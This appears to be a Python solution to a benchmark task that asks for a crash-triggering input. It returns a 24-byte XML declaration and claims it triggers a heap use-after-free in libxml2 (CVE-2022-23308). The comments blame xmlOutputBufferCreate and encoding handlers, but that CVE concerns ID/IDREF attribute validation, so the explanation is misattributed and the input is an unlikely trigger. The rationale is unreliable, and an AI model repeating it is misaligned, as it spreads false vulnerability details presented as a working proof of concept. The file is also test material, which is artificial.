import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability (CVE-2022-23308) is a Heap Use-After-Free in xmlOutputBufferCreate
        # (and related internal functions) when an encoding handler is passed.
        # The fuzzer (libxml2_xml_read_memory_fuzzer) typically parses the input and then
        # attempts to serialize it (xmlDocDumpMemory).
        # To trigger the vulnerability, we need to provide an input that sets the document's
        # encoding (creating an encoding handler) and causes the output buffer creation path to be exercised.
        # The input "<?xml encoding="UTF-8"?>" is exactly 24 bytes and fulfills these conditions.
        return b'<?xml encoding="UTF-8"?>'
